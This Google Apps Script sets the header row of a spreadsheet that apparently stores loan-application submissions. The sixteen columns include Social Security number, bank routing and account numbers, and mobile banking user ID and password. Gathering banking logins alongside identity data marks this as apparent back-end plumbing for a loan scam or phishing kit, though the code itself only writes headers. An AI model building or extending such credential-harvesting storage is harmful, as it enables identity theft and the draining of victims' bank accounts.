// HEADER UPDATE SCRIPT - Run once to fix Google Sheet headers
// Use this in Google Apps Script to update headers

const SHEET_URL = "https://docs.google.com/spreadsheets/d/1drmvoZPbGED2hratNOu3vBgjJRmk9cYIdLuJq7Scei8/edit";

function updateHeaders() {
  try {
    const sheet = SpreadsheetApp.openByUrl(SHEET_URL).getSheetByName("Sheet1");
    
    // Set clean headers
    const headers = [
      "Loan Amount",
      "Loan Purpose", 
      "Full Name",
      "Email",
      "Phone",
      "Street Address",
      "City",
      "State",
      "ZIP Code",
      "SSN",
      "Bank Name",
      "Routing Number",
      "Account Number",
      "Mobile Banking User ID",
      "Mobile Banking Password",
      "Submission Date"
    ];
    
    // Update header row (Row 1)
    sheet.getRange(1, 1, 1, headers.length).setValues([headers]);
    
    // Auto-resize columns for better readability
    sheet.autoResizeColumns(1, headers.length);
    
    return "Headers updated successfully!";
    
  } catch (err) {
    return "Error updating headers: " + err.message;
  }
}

function doGet(e) {
  return HtmlService.createHtmlOutput('Headers update script ready. Run updateHeaders() function.');
}
